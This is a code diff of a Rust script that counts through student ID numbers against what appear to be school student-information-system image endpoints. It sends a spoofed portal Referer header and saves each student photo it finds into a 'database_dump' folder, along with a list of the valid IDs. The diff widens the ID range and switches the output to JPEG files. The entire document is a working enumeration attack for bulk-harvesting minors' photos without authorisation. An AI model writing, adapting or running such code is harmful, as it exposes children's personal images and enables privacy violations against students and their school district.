@@ -13,20 +13,20 @@ const s241:&str = "https://sisstudentsts-241.campusnet.net/image.ashx?name=";
 fn run() -> Result<(), Box<dyn std::error::Error>> {
     let client = reqwest::Client::new();
     let mut idList = fs::File::create("./database_dump/_idList.txt").unwrap();
-    for id in 0..10020{
-        let idstr = &format!("{:0>8}", id.to_string()) as &str;
+    for id in 0..99999{
+        let idstr = &format!("{:0>5}", id.to_string()) as &str;
         let mut res:reqwest::Response = client
             .get(&(mpls.to_string() + idstr + ".JPG") as &str)
             .header(REFERER, "https://sisportal.mpls.k12.mn.us/gradebook_student_schedule_enroll.aspx?")
             .send()
             .unwrap();
         if(res.status() == 200){
-            println!("id# {} exists", id);
+            println!("id# {} exists", idstr);
             let mut body = Vec::new();
-            let mut file = fs::File::create(&("./database_dump/".to_string() + idstr + ".html") as &str).unwrap();
+            let mut file = fs::File::create(&("./database_dump/".to_string() + idstr + ".jpeg") as &str).unwrap();
             res.read_to_end(&mut body)?;
             file.write_all(body.as_mut_slice());
-            idList.write(idstr as &[u8]);
+            idList.write(idstr.as_bytes());
             idList.write(b"\n");
         }
     }
